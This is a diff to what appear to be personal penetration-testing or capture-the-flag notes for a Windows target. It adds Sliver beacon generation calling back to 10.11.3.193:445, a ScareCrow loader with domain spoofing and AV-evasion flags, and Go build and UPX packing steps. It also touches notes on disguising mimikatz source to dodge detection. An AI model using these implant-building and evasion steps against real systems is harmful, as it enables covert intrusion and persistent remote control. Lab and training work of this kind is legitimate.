@@ -368,6 +368,17 @@ And with a great name!
 
 Run Seatbelt for late and check that this actually is not just a rug pull. Interactive broke. Not sure if it was seatbelt.
 ![](atleast2minstesting-interactive-broke.png)
+
+```
+generate beacon --mtls  10.11.3.193:445 --arch amd64 --os windows --save /tmp/445-sliver.bin -f shellcode -G
+
+/opt/ScareCrow/ScareCrow -I /tmp/445-sliver.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
+# Build with golang
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
+# Pack with upx
+upx $file.exe
+
+```
 ## Privilege Escalation To Bob
 
 ## Privilege Escalation To NT System
@@ -502,7 +513,7 @@ Response.Write("</pre>");
 	- modules
 
 
-Remove all commentsa after replace just to have some chunk and so it does not look very stripped
+Remove all comments after replace just to have some chunk and so it does not look very stripped
 
 - Add comments:
 - AI generate conversation in comments 
@@ -510,7 +521,7 @@ Remove all commentsa after replace just to have some chunk and so it does not lo
 	- `WTF does this do {Y person}`
 - AI generate junk descriptions
 
-- Remvoe all frenchness ` coffee =kdbg_coffee`, replace with getTheNuts c stdout silly file 
+- Remove all frenchness ` coffee =kdbg_coffee`, replace with getTheNuts c stdout silly file 
 
 Replace in mimikatz.c
 ```
